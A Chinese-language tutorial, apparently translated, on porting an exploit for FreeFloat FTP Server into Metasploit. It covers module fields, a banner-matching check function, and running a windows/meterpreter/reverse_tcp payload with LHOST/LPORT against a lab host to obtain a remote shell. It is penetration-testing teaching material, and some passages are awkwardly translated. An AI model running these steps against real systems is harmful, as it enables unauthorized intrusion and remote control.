Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发对计算机软件漏洞，并实施攻击。它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。


当H.D. Moore在2003年发布Metasploit时，带来的影响是巨大的，仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的主机。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。

Language Barrier

为便于理解，下面是代码的快速翻译，对加载到Metasploit框架的漏洞的Python代码进行说明：

1）我们的import sys, socket参数将是我们的RHOST，LHOST，FTP混合和连接/断开/处理函数。

2）我们的目标以结构化方式指定，包括我们的返回地址，偏移或堆栈调整以及平台类型。

3）我们的有效载荷将通过控制台或GUI进行选择，但在代码中，我们只需要把payload.encoded作为入口点。


将模块移植到Metasploit时，我发现开始这一过程的最简单方法是复制创建的漏洞，辅助或其他模块类型的示例模板。下面是在Linux系统上搜索sample.rb的方法。


有一次偶然中，我的导师高级安全研究员James Fitts告诉我，将测试模块加载到/root/.msf4目录是最佳做法（对于一些较旧的框架，数字可能不同）。


例如：你制作的Metasploit的重制文件exploit / windows / smb / pec，应该存储在/root/.msf4/modules/perfits/windows/smb/pec.rb中。这使跟踪模块的执行过程变得方便并且防止原始漏洞被意外删除。


下一步是将相应的exploits / sample.rb文件复制到/root/.msf4目录中（在本例中为/root/.msf4/modules/exploits/windows/ftp/）。如果系统中在根目录下没有exploit文件夹，使用mkdir -p进行添加。

对于我们选择的样本，我会以报告的形式进行记录。下面描述的是漏洞模板的前半部分：

字段说明第1部分

‘Name’ 用作漏洞利用的名称，并将显示在 Search panle中。

‘Description’是对评估漏洞的描述。

‘License’ 是'MSF_LICENSE'。

‘Author’ 作为一个参数来列出那些对模块的作出贡献的人，不管它是漏洞的发起者，利用者，还是公开者。

‘References’ 列出CVEs和与漏洞有关的其他参考资料。

'Payload'是指定缓冲空间大小和禁用字符。

'Targets'是当指定系统被攻击时，我们控制EIP后所返回的地址和偏移量。

攀登

当模块准备就绪后，你会发现漏洞可利用的数量已经增加。


执行搜索操作。注意：ruby文件的名称将成为Metasploit中的漏洞利用程序的名称，因此不要复制同一类别（ftp，http，smtp等）中现有模块的名称以避免混淆。


一旦我们找到了我们正在寻找的漏洞（在我们的例子中是freefloatftp-primal），选择use exploit / windows / ftp / freefloatftp-primal，然后按回车加载该模块。

执行检查功能

在Metasploit模块中定义“check”功能，以确定目标主机是否符合漏洞执行条件。在这个演示中，使用了以下代码：

def check    

connect # connect to target host port   

 disconnect # disconnect from target host port   


 if (banner =~ /FreeFloat Ftp Server (Version 1.00)/) # Use regex to check banner    

 return Exploit::CheckCode::Vulnerable # if regex matche in banner string, vulnerable    end # Otherwise      

return Exploit::CheckCode::Safe # print the service is "safe" or not vulnerable    end

当对目标192.168.133.128执行检测时，发生以下行为：

1）连接到目标。

2）模块与目标断开连接。

3）使用Ftp mixin，Metasploit存储它收到的banner，并创建了一个条件语句来检查它是否与我们正在搜索的内容匹配。

4）如果内容符合Exploit :: CheckCode：Vulnerable将在屏幕上输出the target is vulnerable(目标可攻击)。如果情况并非如此，则告诉用户目标不可利用。

5）根据我们定义的检测参数，让我们看看执行结果：


正如预期的那样，该banner符合我们的搜索参数，并且为了演示，我们可以假设该服务确实是存在隐患的。注意：我们没有考虑更改默认banner的用户。

选择有效载荷。


下一步是选择一个有效载荷。尝试输入show payloads，然后按回车键以显示可用于此漏洞的有效载荷。


经过检查之后，我根据缓存大小决定选择meterpreter作为效载荷将，有效载荷在使用之前需要进行编码，以便去掉敏感字符。


键入set payload windows / meterpreter / reverse_tcp，已设置有效载荷，然后使用以下选项来满足其执行要求：

set LPORT <any available port>    


set LHOST <set this to your IP address>

之前，我们为此有效负载设置缺省的退出方法，以调用Windows内部函数ExitThread（）（位于Kernel32.dll中），该函数功能将返回shell退出后的原始进程。


另一种安全退出（none，seh和process）的方法将在以后的文章中描述，但如果你很好奇，也可以输入以下命令更改EXITFUNC参数：

set EXITFUNC <thread, seh, process, none>

现在我们已经完成了启动我们的漏洞的所有要求（在这种情况下，只有一个目标），输入exploit并点击回车，等待运行结果。我通常使用“-j”作为exploit执行的参数，执行成功后，会返回目标主机一个控制台的shell。


友情提示：

编辑模块时，在对漏洞完成新的更新之后使用reload命令互很有用，因为这会阻止你完全退出Metasploit并重新加载整个过程。  exploit会根据最后给定的参数设置重新加载漏洞并将其关闭。
